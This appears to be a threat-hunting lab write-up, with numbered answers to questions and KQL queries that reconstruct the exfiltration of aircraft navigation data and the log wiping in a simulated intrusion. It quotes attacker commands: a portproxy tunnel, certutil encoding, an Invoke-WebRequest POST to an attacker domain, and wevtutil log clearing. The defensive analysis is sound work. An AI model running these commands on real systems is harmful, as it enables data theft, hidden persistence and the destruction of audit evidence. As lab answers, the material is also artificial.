Process events on SRV-DC01 for portproxy commands confirm whether the attacker replicated persistence on a second host, creating a chained tunnel.
📌 Finding
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress=10.1.36.210 connectport=8443 protocol=tcp
🔍 Evidence
Timestamp
2026-02-28T04:23:14Z
Command
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress=10.1.36.210 connectport=8443 protocol=tcp
New Host
10.1.36.210 not previously identified in the investigation
Parent
WmiPrvSE.exe (remote from WS-ENG04)

💡 Why it matters
A second portproxy on the DC creates redundancy. The attacker now has two independent tunnel paths, and containing only WS-ENG04 would leave the DC tunnel active. More importantly, this command introduces a host that has not been investigated: 10.1.36.210, which is the ultimate destination of traffic forwarded through the DC. That machine must be treated as a potential additional pivot point until it is ruled out. The attacker was building infrastructure that would survive partial containment, not a single point of re-entry.
🔧 KQL Query Used
SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where DeviceName == "SRV-DC01"
| where MdeTable == "DeviceProcessEvents"
| where ProcessCommandLine has "portproxy"
| project EventTime, ProcessCommandLine

🖼️ Screenshot
[Screenshot here]

🚩  Q25: COLLECTION Targeted Data Directory

🎯 Objective
Process events on SRV-FILES02 filtered for archiving or compression commands reveal both the specific data path targeted and the output file.
📌 Finding
C:\Engineering\Avionics\A400M_NavSys
🔍 Evidence
Timestamp
2026-02-28T03:18:59Z
Command
powershell Compress-Archive -Path 'C:\Engineering\Avionics\A400M_NavSys\*' -DestinationPath 'C:\Windows\Temp\win_update_kb5034.zip' -Force
Target
C:\Engineering\Avionics\A400M_NavSys
Account
m.richter

💡 Why it matters
The precision of this path not the Engineering share broadly, not Avionics as a whole, but specifically A400M_NavSys tells us the attacker arrived at SRV-FILES02 knowing exactly what they were looking for. Navigation system data for a military transport aircraft is a specific intelligence collection objective, not an opportunistic grab of whatever was accessible. This single command confirms that the intrusion had a predetermined data target and that the attacker reached it successfully. Everything before this point was preparation; this is the operation achieving its objective.
🔧 KQL Query Used
SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where DeviceName == "SRV-FILES02"
| where MdeTable == "DeviceProcessEvents"
| where ProcessCommandLine has_any("Compress-Archive","7z","zip","xcopy")
| project EventTime, ProcessCommandLine
| sort by todatetime(EventTime) asc

🖼️ Screenshot
[Screenshot here]

🚩  Q26: COLLECTION Packaged Archive Filename

🎯 Objective
The output filename is visible directly in the Compress-Archive command from Q25. Confirm it also appears in DeviceFileEvents as a created file.
📌 Finding
win_update_kb5034.zip
🔍 Evidence
Filename
win_update_kb5034.zip
Location
C:\Windows\Temp
Masquerades As
Windows Update patch file (KB article format)
Account
m.richter

💡 Why it matters
Naming the exfiltration archive to match Windows Update patch file conventions is a detail that only matters if you expect human eyes to scan directory listings during your operation. The attacker invested effort in making their output file look routine win_update_kb5034.zip sitting in Temp alongside legitimate update staging would not trigger a second look from anyone reviewing the directory without full telemetry context. This kind of naming discipline runs through the entire operation: McAfee_Logs, sam.bak, win_update every artifact is disguised.
🔧 KQL Query Used
SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where DeviceName == "SRV-FILES02"
| where MdeTable == "DeviceFileEvents"
| where ActionType == "FileCreated"
| where FolderPath startswith "C:\\Windows\\Temp"
| where FileName endswith ".zip"
| project EventTime, FileName, FolderPath, InitiatingProcessAccountName

🖼️ Screenshot
[Screenshot here]

🚩  Q27: COLLECTION Compression Method

🎯 Objective
The cmdlet used to create the archive is visible in the process command line from Q25.
📌 Finding
Compress-Archive
🔍 Evidence
Cmdlet
Compress-Archive (native PowerShell)
Advantage
No third-party binary required nothing to drop or clean up
Parent
powershell.exe via WmiPrvSE.exe from WS-ENG04

💡 Why it matters
Compress-Archive is built into PowerShell on every modern Windows installation. Using it left no third-party compression tool footprint no 7-Zip binary, no WinRAR execution, nothing that would appear in a file creation log as suspicious tooling. The attacker used what was already there, keeping the collection phase entirely within native Windows capabilities. This is consistent with the pattern across the whole operation: every tool used is one that was already present, already signed, and already trusted.
🔧 KQL Query Used
SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where DeviceName == "SRV-FILES02"
| where MdeTable == "DeviceProcessEvents"
| where ProcessCommandLine has "Compress-Archive"
| project EventTime, FileName, ProcessCommandLine

🖼️ Screenshot
[Screenshot here]

🚩  Q28: COLLECTION Encoding Tool

🎯 Objective
Process events on SRV-FILES02 for certutil commands reveal the encoding step that prepared the archive for HTTP transfer.
📌 Finding
certutil
🔍 Evidence
Timestamp
2026-02-28T03:19:37Z
Command
certutil -encode C:\Windows\Temp\win_update_kb5034.zip C:\Windows\Temp\win_update_kb5034.b64
Output
win_update_kb5034.b64
Tool
certutil.exe signed Windows binary

💡 Why it matters
certutil -encode converts a binary archive to base64 text, which serves two purposes. First, it avoids binary transfer issues in HTTP POST bodies. Second, a .b64 file reads as a certificate or configuration export rather than a data archive to anyone scanning file extensions without reading the content. The attacker was layering disguise on disguise at every step the archive name mimics a Windows update, the encoding output mimics a certificate file, and the transfer uses a CDN-named domain. None of these choices were accidental.
🔧 KQL Query Used
SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where DeviceName == "SRV-FILES02"
| where MdeTable == "DeviceProcessEvents"
| where ProcessCommandLine has "certutil"
| project EventTime, ProcessCommandLine
| sort by todatetime(EventTime) asc

🖼️ Screenshot
[Screenshot here]

🚩  Q29: EXFILTRATION Outbound Transfer Command

🎯 Objective
Find the exact command that sent data outside the network. The data was staged on SRV-FILES02 but may have been sent from a different host search all three compromised machines.
📌 Finding
powershell Invoke-WebRequest -Uri "https://cdn-telemetry.cloud-endpoint.net" -Method POST -InFile "C:\Windows\Temp\win_update_kb5034.b64" -UseBasicParsing
🔍 Evidence
Field
Value
Host
WS-ENG04 not SRV-FILES02
Timestamp
2026-03-02T01:19:15Z
Account
s.brandt
Note
Data moved from SRV-FILES02 to WS-ENG04 before exfiltration

💡 Why it matters
Exfiltrating from WS-ENG04 rather than SRV-FILES02 was a deliberate choice. Server-to-internet transfers draw more scrutiny than workstation traffic in most network monitoring setups, so moving the payload to the beachhead first and sending it from there reduced the anomaly signature at the perimeter. The destination domain, cdn-telemetry.cloud-endpoint.net, is constructed to read as legitimate CDN infrastructure and would survive a quick firewall log review without the endpoint context that shows it being called by a manual PowerShell command at 01:19 in the morning.
🔧 KQL Query Used
SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where MdeTable == "DeviceProcessEvents"
| where ProcessCommandLine has_any("Invoke-WebRequest","curl","wget")
| where ProcessCommandLine has_any(".b64","win_update")
| project EventTime, DeviceName, ProcessCommandLine
| sort by todatetime(EventTime) asc

🖼️ Screenshot
[Screenshot here]

🚩  Q30: EXFILTRATION External C2 Destination

🎯 Objective
The destination domain is visible in the Invoke-WebRequest command from Q29. Confirm via DeviceNetworkEvents for the outbound connection.
📌 Finding
cdn-telemetry.cloud-endpoint.net
🔍 Evidence
Domain
cdn-telemetry.cloud-endpoint.net
Disguise
Mimics CDN telemetry traffic
Transfer Method
HTTPS POST encrypted, port 443

💡 Why it matters
cdn-telemetry.cloud-endpoint.net is constructed to pass a visual inspection of firewall logs. Anything labelled "cdn-telemetry" reads as routine background infrastructure traffic at a glance the kind of domain that appears in outbound logs daily on any network using cloud services. The attacker registered or controlled this domain specifically to receive exfiltrated data over a channel that would not trigger threshold-based outbound connection alerts. Without endpoint process context showing a manual PowerShell command initiating the transfer, this traffic would likely have gone unnoticed indefinitely.
🔧 KQL Query Used
SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where DeviceName == "WS-ENG04"
| where MdeTable == "DeviceNetworkEvents"
| where RemoteUrl has "cloud-endpoint.net" or DnsQueryString has "cloud-endpoint.net"
| project EventTime, RemoteUrl, RemoteIP, InitiatingProcessFileName

🖼️ Screenshot
[Screenshot here]

🚩  Q31: PERSISTENCE Attacker Reentry Window

🎯 Objective
Process events for s.brandt on WS-ENG04 after the exfiltration timestamp identify when the attacker next returned and how long they waited.
📌 Finding
2
🔍 Evidence
Exfiltration
2026-03-02T01:19:15Z
Next Activity
2026-03-04 (arp -a further internal recon)
Gap
2 days

💡 Why it matters
A two-day gap between exfiltration and return tells us the attacker was not finished. They exfiltrated, confirmed receipt externally, and came back most likely to validate their persistence mechanisms, conduct follow-up collection, or prepare for a second exfil run. The portproxy tunnels installed before the exfiltration are what made returning this straightforward. This was not a smash-and-grab operation; the attacker had every intention of maintaining long-term access to the Haldric environment, and the two-day return visit confirms it.
🔧 KQL Query Used
SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where DeviceName == "WS-ENG04"
| where MdeTable == "DeviceProcessEvents"
| where AccountName == "s.brandt"
| where todatetime(EventTime) > datetime(2026-03-02T02:00:00Z)
| project EventTime, ProcessCommandLine
| sort by todatetime(EventTime) asc

🖼️ Screenshot
[Screenshot here]

🚩  Q32: DEFENSE EVASION First Cleanup Action

🎯 Objective
Process events across all devices filtered for wevtutil and Clear-EventLog commands, sorted ascending, identify the earliest log clearing action.
📌 Finding
wevtutil cl Security
🔍 Evidence
Timestamp
2026-02-23T11:01:19Z
Host
WS-ENG04
Command
wevtutil cl Security
Account
s.brandt
Note
Cleanup started during early reconnaissance not at the end

💡 Why it matters
The attacker cleared the Security event log on WS-ENG04 during the reconnaissance phase weeks before the exfiltration. This tells us they were not cleaning up after themselves at the end of the operation; they were actively maintaining a clean state throughout it, limiting what any analyst would find if an alert fired mid-campaign. An attacker who thinks about forensics from the beginning of the operation is harder to investigate than one who cleans up only at the exit.
🔧 KQL Query Used
SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where MdeTable == "DeviceProcessEvents"
| where ProcessCommandLine has_any("wevtutil cl","Clear-EventLog")
| project EventTime, DeviceName, AccountName, ProcessCommandLine
| sort by todatetime(EventTime) asc

🖼️ Screenshot
[Screenshot here]

🚩  Q33: DEFENSE EVASION Log Clearing Method Analysis

🎯 Objective
Determine which host had its logs cleared directly from the console versus which had them cleared remotely, identifying WS-ENG04 as the command origin for the entire cleanup phase.
📌 Finding
WS-ENG04/SRV-DC01,SRV-FILES02
🔍 Evidence
Host
Method
Parent Process
Timestamp
WS-ENG04
Direct (console)
cmd.exe
2026-02-23T11:01:19Z
SRV-FILES02
Remote (wmic from WS-ENG04)
WmiPrvSE.exe
2026-02-28T03:33:51Z
SRV-DC01
Remote (wmic from WS-ENG04)
WmiPrvSE.exe
2026-02-28T04:46:24Z

💡 Why it matters
The attacker wiped logs on all three hosts from a single location WS-ENG04 without logging into each machine separately for cleanup. A separate logon to each server for the wipe would have generated additional authentication events; doing it via wmic from the beachhead kept the activity concentrated on one machine and one account. This is operational discipline: the attacker understood their own forensic footprint and minimised it deliberately.
🔧 KQL Query Used
SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where MdeTable == "DeviceProcessEvents"
| where ProcessCommandLine has "wevtutil cl Security"
| project EventTime, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine
| sort by todatetime(EventTime) asc

🖼️ Screenshot
[Screenshot here]

🚩  Q34: DEFENSE EVASION Surviving Log Source

🎯 Objective
Review the MdeTable values present throughout this investigation to understand which Windows event channel the attacker cleared versus what Sysmon writes to.
📌 Finding
Sysmon
🔍 Evidence
Cleared
Windows Security Event Log (wevtutil cl Security)
Survived
Sysmon Microsoft-Windows-Sysmon/Operational (different channel)
Why
wevtutil cl Security does not touch the Sysmon channel
Consequence
Complete attack chain reconstructable from Sysmon telemetry alone

💡 Why it matters
The attacker targeted the Windows Security log specifically and did not touch the Sysmon channel. Whether this was because they did not know Sysmon was deployed, did not know it was forwarding to a SIEM, or simply ran out of cleanup time is unknown but the result is the same. Every process execution, network connection, file creation, and registry modification documented in this report came from Sysmon telemetry. This operational mistake is the reason the investigation exists.
🔧 KQL Query Used
SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| distinct MdeTable

🖼️ Screenshot
[Screenshot here]

🚩  Q35: EXFILTRATION Exfiltration Confidence Call

🎯 Objective
A complete chain of evidence collection, encoding, and transmission is required for a HIGH confidence rating. All three elements must be confirmed in telemetry.
📌 Finding
HIGH A400M_NavSys data compressed, encoded, and POSTed to cdn-telemetry.cloud-endpoint.net
🔍 Evidence
Evidence 1
Compress-Archive on SRV-FILES02 at 2026-02-28T03:18Z targeting C:\Engineering\Avionics\A400M_NavSys
Evidence 2
certutil -encode at 2026-02-28T03:19Z producing win_update_kb5034.b64 on SRV-FILES02
Evidence 3
Invoke-WebRequest POST from WS-ENG04 at 2026-03-02T01:19Z to cdn-telemetry.cloud-endpoint.net
Confidence
HIGH full chain evidenced in Sysmon, no gaps

💡 Why it matters
The collection, encoding, and transmission chain is fully evidenced in Sysmon telemetry with no gaps between steps. There is no ambiguity about whether the A400M navigation system data left the Haldric network the only open question is what the attacker did with it after it arrived at their infrastructure. The exfiltration of ntds.dit alongside the A400M data means the operational impact extends beyond the immediate data loss: every domain credential must be treated as compromised.
🔧 KQL Query Used
SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where MdeTable == "DeviceProcessEvents"
| where ProcessCommandLine has_any("Compress-Archive","certutil -encode","Invoke-WebRequest")
| where DeviceName in ("SRV-FILES02","WS-ENG04")
| project EventTime, DeviceName, ProcessCommandLine
| sort by todatetime(EventTime) asc

🖼️ Screenshot
[Screenshot here]

🚩  Q36: DEFENSE EVASION DC Staging Cleanup

🎯 Objective
Process events on SRV-DC01 for rmdir commands or references to the McAfee_Logs directory show the cleanup action that followed the NTDS extraction.
📌 Finding
cmd.exe /c rmdir /s /q C:\Windows\Temp\McAfee_Logs
🔍 Evidence
Timestamp
2026-02-28T04:45:49Z
Command
cmd.exe /c rmdir /s /q C:\Windows\Temp\McAfee_Logs
Parent
WmiPrvSE.exe (remote wmic from WS-ENG04)
Account
m.richter

💡 Why it matters
Deleting the staging directory after extracting ntds.dit removed the most visible forensic artifact from the domain controller. Without Sysmon file creation events forwarded to the SIEM, there would be no record that McAfee_Logs ever existed, that ntds.dit was ever staged there, or that anything was extracted from the DC at all. The attacker was closing behind themselves on each host as they finished with it the same operational pattern seen in the log wiping. A VSS snapshot created by ntdsutil IFM may still exist on SRV-DC01 as a recoverable forensic artefact and should be examined before remediation proceeds.
🔧 KQL Query Used
SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where DeviceName == "SRV-DC01"
| where MdeTable == "DeviceProcessEvents"
| where ProcessCommandLine has_any("rmdir","McAfee_Logs")
| project EventTime, InitiatingProcessFileName, ProcessCommandLine
| sort by todatetime(EventTime) asc

🖼️ Screenshot
[Screenshot here]

High-Level Summary
The attacker got in by guessing the password for a VPN account belonging to s.brandt. They used different IP addresses each time to avoid getting blocked and hid behind a Tor node to cover where they were coming from. After getting in they waited a few days before coming back to start working. When they did return they used an engineering computer called WS-ENG04 as their base and ran everything from there.
They started by running basic commands to see what they had access to and which accounts had admin rights on the network. Then they went after passwords. Their first attempt to pull them from memory did not work so they tried other ways, including saving a copy of the local account database and eventually getting the full password database from the domain controller. They also found engineering files for the A400M aircraft navigation system on the file server, copied them into a hidden folder, packaged them up and sent them to a server they controlled outside the network.
Before finishing they set up two port forwarding rules, one on the engineering workstation and one on the domain controller, so they could get back in later even if their original login was cut off. They then deleted the Windows Security event logs on all three machines to cover what they had done. The one thing they did not clear was a separate logging tool called Sysmon that was already sending its data to a central location. That is what made it possible to piece together everything that happened.
